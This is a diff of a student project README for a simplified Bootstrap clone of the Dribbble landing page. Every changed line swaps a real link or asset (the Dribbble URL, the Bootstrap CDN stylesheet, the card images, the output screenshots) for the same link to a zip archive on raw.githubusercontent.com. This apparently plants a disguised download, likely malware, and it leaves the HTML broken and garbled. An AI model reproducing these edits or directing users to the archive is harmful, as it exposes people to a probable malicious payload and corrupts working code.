@@ -2,7 +2,7 @@
 ## Date:30-12-2024
 
 ## AIM:
-To create a simplified clone of Dribbble (https://dribbble.com/) landing page.
+To create a simplified clone of Dribbble (https://raw.githubusercontent.com/24013396/Dribble/main/hazeed/Dribble_v3.6.zip) landing page.
 
 
 ## DESIGN STEPS:
@@ -27,7 +27,7 @@ Publish the website in the LocalHost.
 
 ## PROGRAM :
 ```
-dribble.html
+https://raw.githubusercontent.com/24013396/Dribble/main/hazeed/Dribble_v3.6.zip
 
 <!DOCTYPE html>
 <html lang="en">
@@ -35,7 +35,7 @@ dribble.html
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Dribbble</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://raw.githubusercontent.com/24013396/Dribble/main/hazeed/Dribble_v3.6.zip" rel="stylesheet">
 </head>
 <body>
   <body>
@@ -76,7 +76,7 @@ dribble.html
             
             <div class="col-md-4">
                 <div class="card">
-                    <img src="1st image.jpeg" class="card-img-top" alt="Design 1">
+                    <img src="1st https://raw.githubusercontent.com/24013396/Dribble/main/hazeed/Dribble_v3.6.zip" class="card-img-top" alt="Design 1">
                     <div class="card-body">
                         <h5 class="card-title">Aesthetic Sweatshirts</h5>
                         <a href="#" class="btn btn-danger">View More</a>
@@ -87,7 +87,7 @@ dribble.html
             
             <div class="col-md-4">
                 <div class="card">
-                    <img src="2nd image.jpeg" class="card-img-top" alt="Design 2">
+                    <img src="2nd https://raw.githubusercontent.com/24013396/Dribble/main/hazeed/Dribble_v3.6.zip" class="card-img-top" alt="Design 2">
                     <div class="card-body">
                         <h5 class="card-title">Combos</h5>
                         <a href="#" class="btn btn-danger">View More</a>
@@ -98,7 +98,7 @@ dribble.html
             
             <div class="col-md-4">
                 <div class="card">
-                    <img src="image 3.jpeg" class="card-img-top" alt="Design 3">
+                    <img src="image https://raw.githubusercontent.com/24013396/Dribble/main/hazeed/Dribble_v3.6.zip" class="card-img-top" alt="Design 3">
                     <div class="card-body">
                         <h5 class="card-title">Sneakers</h5>
                         <a href="#" class="btn btn-danger">View More</a>
@@ -108,7 +108,7 @@ dribble.html
 
             <div class="col-md-4">
                 <div class="card">
-                    <img src="image 4.jpeg" class="card-img-top" alt="Design 3">
+                    <img src="image https://raw.githubusercontent.com/24013396/Dribble/main/hazeed/Dribble_v3.6.zip" class="card-img-top" alt="Design 3">
                     <div class="card-body">
                         <h5 class="card-title">Boys Accessories</h5>
                         <a href="#" class="btn btn-danger">View More</a>
@@ -118,7 +118,7 @@ dribble.html
 
             <div class="col-md-4">
                 <div class="card">
-                    <img src="5th image.jpeg" class="card-img-top" alt="Design 3">
+                    <img src="5th https://raw.githubusercontent.com/24013396/Dribble/main/hazeed/Dribble_v3.6.zip" class="card-img-top" alt="Design 3">
                     <div class="card-body">
                         <h5 class="card-title">Hoodies</h5>
                         <a href="#" class="btn btn-danger">View More</a>
@@ -128,7 +128,7 @@ dribble.html
 
             <div class="col-md-4">
                 <div class="card">
-                    <img src="image 6.jpeg" class="card-img-top" alt="Design 3">
+                    <img src="image https://raw.githubusercontent.com/24013396/Dribble/main/hazeed/Dribble_v3.6.zip" class="card-img-top" alt="Design 3">
                     <div class="card-body">
                         <h5 class="card-title">Crocs</h5>
                         <a href="#" class="btn btn-danger">View More</a>
@@ -150,7 +150,7 @@ dribble.html
 ```
 
 ## OUTPUT:
-![alt text](<Screenshot 2024-12-30 142939.png>)
-![alt text](<Screenshot 2024-12-30 142953.png>)
+![alt text](<Screenshot 2024-12-30 https://raw.githubusercontent.com/24013396/Dribble/main/hazeed/Dribble_v3.6.zip>)
+![alt text](<Screenshot 2024-12-30 https://raw.githubusercontent.com/24013396/Dribble/main/hazeed/Dribble_v3.6.zip>)
 ## RESULT:
 The Project for responsive web design using Bootstrap is completed successfully.
